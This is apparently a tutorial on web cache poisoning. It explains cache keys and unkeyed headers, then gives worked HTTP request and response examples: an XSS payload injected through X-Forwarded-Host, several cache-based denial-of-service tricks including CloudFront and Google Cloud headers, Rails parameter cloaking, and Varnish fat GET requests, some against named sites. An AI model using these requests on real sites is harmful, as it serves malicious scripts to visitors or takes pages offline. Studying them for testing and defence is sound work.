So, actually there are two types of server:
1. Web Server which stores everything
2. The Caching Server

![Image](https://miro.medium.com/max/640/1*gVdpuGo4XhaqJVc_L3_27g.webp)

So, The `Cache Server or Cache` sits between the `server` and the `user`, where it saves **Caches** the responses to particular requests, usually for a fixed amount of time.

In this scenario, If another user then sends an equivalent request, the cache simply serves a copy of the cached response directly to the user, without any interaction from the back-end, which decrease the latency.So we can say that, **`Caching`** is intended to speed up page loads by reducing latency, and also reduce load on the application server.

## Types Of Caches:

1. **Client side Cache:** It is the cache system that is built-in in a browser. It is used for storing `files and content` that is linked with the browser we are using.
2. **DNS Cache:** `DNS cache` refers to the temporary storage of information about previous DNS lookups on a machine’s OS or web browser. This keeps a copy of DNS lookups done by the browser.
3. **Web Cache:** Data that your device stores when visiting a website for the first time includes images, scripts or other media files such as gifs.

**Note: Web Cache is used for storing JS,CSS,Images etc. files which are used by the browsers, but `Cache Poisoning` arises when we can cache any other things which we will discuss now.**

***
# Cache Keys:

Whenever a cache receives a request for a resource, it needs to decide whether it has a copy of this exact resource already saved and can reply with that, or if it needs to forward the request to the application server.

The `cache key` is **the unique identifier for an object in the cache**.Each object in the cache has a unique cache key.So, only a few components of the request are checked for retrieving the cached response.

![[Screenshot 2022-12-31 213511.jpg]]

Everything in the above request in color `orange` is the Cache Key. That means that if any further request contains the above cache key which is `/blog/post.php?mobile=1` and `example.com` then the `Cache Server` will return the response itself and will not forward it to the `Main Server`.

**Keyed Input:** `/blog/post.php?mobile=1` and `example.com` and everything that is included in <mark class="hltr-orange">Cache Key</mark>.
**Unkeyed Input:** `All other Headers and their values in the above Image`

Whenever a cache resource is requested, it is very in-efficient to check the request byte-by-byte with the prior cached request. So to solve this issue the concept of `Cache Keys`  is there.

*TIP: To get the Cache Key from an akamai using wesite use this header `Pragma: akamai-x-get-cache-key, akamai-x-get-true-cache-key` but note that this doesn't work always*

***

# Cache Poisoning:

**The objective of web cache poisoning is to send a request that causes a harmful response that gets saved in the cache and served to other users.This is mainly done by unkeyed inputs like HTTP headers**

## Methodology:

In the first step we will identify the Unkeyed Inputs, which can be done by using a burp extension named **Param Miner** which can be downloaded from **Bapp Store** for free. 
Whether a page gets cached may be based on a variety of factors including the file extension, content-type, route, status code, and response headers.

**Note: When auditing a live website, accidentally poisoning other visitors is a perpetual hazard. So we use Cache Buster. We can add a cache buster in a request by appending any ramdom Parameter like `/message.php?anythingrandom`**

***

**Example of XSS via Cache Poisoning:**


```
GET / HTTP/1.1  
Host: www.redhat.com  
X-Forwarded-Host: url.com
  
HTTP/1.1 200 OK  
Cache-Control: public, no-cache  
X-Cache: Hit
…  
<meta property="og:image" content="https://url.com/cms/social.png" />
```


In the above code the `Param Miner` found that `X-Forwarded-Host:` is unkeyed input, and we can see that its value is been reflected in the meta tag in the response.

So, We will now change the Value of `X-Forwarded-Host` to XSS payload:

```
GET /en?dontpoisoneveryone=1 HTTP/1.1  
Host: www.redhat.com  
X-Forwarded-Host: hello.com"><script>alert(1)</script>  
  
HTTP/1.1 200 OK  
X-Cache: HIT
…  
<meta property="og:image" content="https://hello.com"><script>alert(1)</script>"/>
```

Now we can see that our javascript payload is escaped from double quotes and is properly executing.
Now If we send `http://www.redhat.com/en?dontpoisoneveryone=1` to anyone then the payload will be executed because it was stored in the `Cache Server` of the app with the Javascript Payload.

***

Now, we will read about the `Vary` which makes it difficult to perform the attack.
The `Vary` can make any header an `keyed` header.

Let's understand it with the help of an example:
![[Screenshot 2023-01-01 220001.jpg]]


In the above scenario, There is the use of `Vary` header which is saying that `User-Agent` Header is a keyed header and thus the Attack will only work if the victim is using `FireFox` version `60.0`

***

**Example of DOS (1st) via Cache Poisoning:**

```
GET / HTTP/1.1  
Host: xyz.com
X-Forwarded-Host: attacker.com  
  
HTTP/1.1 302 Found  
Location: https://attacker.com/
X-Cache: HIT
```

In the above example we found an unkeyed header which is `X-Forwarded-Host`

So, here we are redirected to the site that we enter in the `X-Forwarded-Host` header,if the response is cached than who ever request for `xyz.com` will be redirected to `attacker.com`, which means that any one will not be able to visit the main homepage of `xyz.com`. Thus it will be recognized as **DOS**.

*TIP: If you get more than one Unkeyed Inputs try to chain them, this could lead to a good bug*

***

**Example of DOS (2nd) via Cache Poisoning:**

This behaviour was detected by <mark class="hltr-orange">James Kettle</mark>  in `Unity's` Website:

![[0dc96adf39de-article-cache-busting-1.svg]]

**The `X-Original-URL` is a header which overrides the path requested by the **Users**.**

In the above request we can see that, `X-Original-URL` header is found which is unkeyed. So here `?x=y` is used as **Cache Buster** and is used in `cache key` and In the `X-Original-URL` header. The path `/education` is being `keyed` but it is of no use as we have provided the path `/gambling` in the Unkeyed Header.
So when ever any user will request for `/education` he will not be able to view it insted he/she will be shown the page gambling.

***

**Example of DOS (3rd) via Cache Poisoning:**

```
GET /?doremembercachebuster HTTP/1.1   
Host: redacted.com      

HTTP/1.1 301 Moved Permanently   
Location: https://redacted.com/en   
CF-Cache-Status: MISS
```

In the above request <mark class="hltr-pink">CloudFlare</mark>  is being used(Identified by `CF-Cache-Status` header). So here we can see that the requesting is getting redirected to `/en`. To attempt DOS here we will change the port of `redacted.com` like `redacted.com:6666` which is a closed port.

```
GET /?doremembercachebuster HTTP/1.1   
Host: redacted.com:6666      

HTTP/1.1 301 Moved Permanently   
Location: https://redacted.com:6666/en   
CF-Cache-Status: MISS
```

Now we can see that we are being redirected to port `6666` which is a dead port. Now we will send the request once again to Cache it.

```
GET /?doremembercachebustedfdfhjfjdgdddhr HTTP/1.1   
Host: redacted.com:6666      

HTTP/1.1 301 Moved Permanently   
Location: https://redacted.com:6666/en   
CF-Cache-Status: HIT
```

We can see that our response is successfully cached `CF-Cache-Status: HIT`. If anyone visits this than he/she will be redirected to a dead port which will cause <mark class="hltr-green">Denial Of Service</mark>

***

**Example of DOS (4th) via Cache Poisoning:**

This type of attack is possible when our parameter values are ==unkeyed==. 

```
GET /login?x=hsdjsdhjsdsdhjh HTTP/1.1   
Host: www.lol.com   
Origin: https://dontpoisoneveryone/      

HTTP/1.1 301 Moved Permanently   
Location: /login/?x=abc
X-Cache: HIT
```

Here our parameter `?x=abc` is not included in the <mark class="hltr-purple">Cache Key</mark> and our response is being cached, we can convert it into an interesting `DOS`. we will change `?x=abc` to `?x=verylong-data.......` so that the `Request Query` becomes reach its maximum length and the one extra `/` added in `Location: /login/?x=abc` makes it one byte more larger and the request will be thus blocked.

```
GET /login?x=abc HTTP/1.1   
Host: www.lol.com   
Origin: https://dontpoisoneveryone/      

HTTP/1.1 414 Request-URI Too Large   
CF-Cache-Status: MISS
```

***

**Rackcache (Ruby on Rails cache Framework) Exploit for Cache Poisoning:**

So the <mark class="hltr-red">Ruby on Rails</mark> Framework treats `;` as `&` in the URL. For Example:

```
/?param1=test&param2=foo  
/?param1=test;param2=foo

These both are same in Ruby On Rails
```

Most of the times, *UTM variables are intended to be processed on the client side, they're ignored by default like:* **utm_content**,**utm_source** etc.

On ruby on rails we can exploit this as follow:

```
GET /main.js?callback=alert(&utm_content=x;callback=alert(1)// HTTP/1.1   
Host: example.com      

HTTP/1.1 200 OK   
X-Cache: HIT

alert(1)//(some-data)
```

In the above request there is a parameter callek `callback` whose value was being reflecting in a js file. So what we did was we add an parameter `utm_content` which is being excluded from the Cache Key as i mentioned above. and we used `;` as a parameter-delimeter, the Cache server sees `callback=legit` as the **utm_content** is excluded from cache key so it confuses and only add the first callback value in the cache Key.

```
GET /jsonp?callback=legit HTTP/1.1   
Host: example.com      

HTTP/1.1 200 OK   
X-Cache: HIT   
alert(1)//(some-data)
```

But, Rails is very chaalak(intelligent) bro, so it recognise that `;` is similar to `&` so it prioritise the second value of ==callback== and return the value in response.

The attack we performed above by hiding the second parameter `callback` from cache key, is known as **Parameter Cloaking.**

*TIP: Another way of doing Parameter Cloaking is simply to send a POST request; certain peculiar systems don't bother including the request method in the cache key.*

***

### Fat Get Attack:

This attack can be performed on the websites using <mark class="hltr-blue">Varnish</mark>.
But there is a catch, It is only possible to perform this attack when the website use Varnish without the `builtin.vcl` snippet in conjunction with a framework that supports GET requests with bodies (hereafter referred to as 'fat GET requests').

[Varnish](https://varnish-cache.org/docs/5.2/whats-new/changes-5.0.html#request-body-sent-always-cacheable-post) Says that:

> Whenever a request has a body, it will get sent to the backend for a cache miss (and pass, as before). This can be prevented by an `unset bereq.body` and the `builtin.vcl` removes the body for GET requests because it is questionable if GET with a body is valid anyway (but some applications use it).

James Kettle found this Varnish Misconfiguration at Github, he was able to cache almost any page.

**Example:**

```
GET /contact/report-abuse?report=albinowax HTTP/1.1   
Host: github.com   
Content-Type: application/x-www-form-urlencoded   
Content-Length: 22      

report=innocent-victim
```

In the above request the ==GET==  parameter `report` is a keyed input while the Body parameter `report` is an unkeyed input, so when anyone will report @albinowax, the innocent-victim will be also reported.


**A module of Ruby On Rails called <mark class="hltr-pink">RackCache</mark> is also vulnerable to FAT-GET.**

***

### Attacking CloudFront CDN:

A typical response from CloudFront when it is **caching**:

```
HTTP/2 200 Ok  
Date: Thu, 01 Dec 2022 07:51:01 GMT  
X-Cache: Hit from cloudfront  
Via: 1.1 2dd59b0ea355cb92a87e9e385032622a.cloudfront.net (CloudFront)  
X-Amz-Cf-Pop: JFK50-P8  
X-Amz-Cf-Id: KQBmzmGEBmmIfprhoM0VXi7RjmiDnGkXkj-_-uJRAFKhCdNuNYVNBw==  
Age: 1082260
```


Most of <mark class="hltr-purple">CloudFront CDN</mark> are vulnerable to Dos via this request header ==> 
* `X-Amz-Server-Side-Encryption: Anything`

For performing this attack, find the pages which are being cached and apply this header.
When we add this header the response gives us a `400 Bad Request`, and when it will be cached then any user that visits the page will not be able to view it and this will cause an <mark class="hltr-pink">DOS</mark>.

**Example:**

```
GET /?test HTTP/2  
Host: example.com  
X-Amz-Server-Side-Encryption: AES256xss  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate  
Upgrade-Insecure-Requests: 1  
Te: trailers
```

**Response:**

```
HTTP/2 400 Bad Request  
Date: Thu, 01 Dec 2022 07:51:01 GMT  
Content-Type: application/xml  
Cache-Control: public,max-age=600  
X-Ua-Compatible: IE=edge,chrome=1  
X-Amz-Cf-Pop: JFK50-P8  
X-Amz-Cf-Id: oEWROikzmcKM5bviUrsPwyFQTbRzS8S7l_-kzH2NSLbChDsc9_K3yA==  
Age: 4
```

***

### Case Studies:

**DOS via Google Cloud:**

Google Cloud Buckets support the use of the `x-http-method-override` header by default, which allows the HTTP method to be overridden.
Appending the header `x-http-method-override: POST`, would return a 405 status code which Fastly does not cache by default. 

So we can use `x-http-method-override: HEAD` and poison the cache into returning an empty response body.

![Image](https://youst.in/images/google.png)

Using this vulnerability on gitlab, the researcher was able to cache Static files located at `https://assets.gitlab-static.net/`. Gitlab awarded $4850 for this.

***

**Rack Middleware Cache Poisoning:**

<mark class="hltr-red">Ruby on Rails</mark> applications are often deployed alongside the Rack middleware. The Rack code below takes the value of the `x-forwarded-scheme` value and uses it as the scheme of the request.

![Image](https://youst.in/images/code.png)

Sending the `x-forwarded-scheme: http` header would result into a 301 redirect to the same location. If the response was cached by a CDN, it would cause a redirect loop, inherently denying access to the file.

This type of vulnerability was identified in shopify main domain **shopify.com** 

![](https://youst.in/images/shopify.png)

This was rewarded **$6300**

***

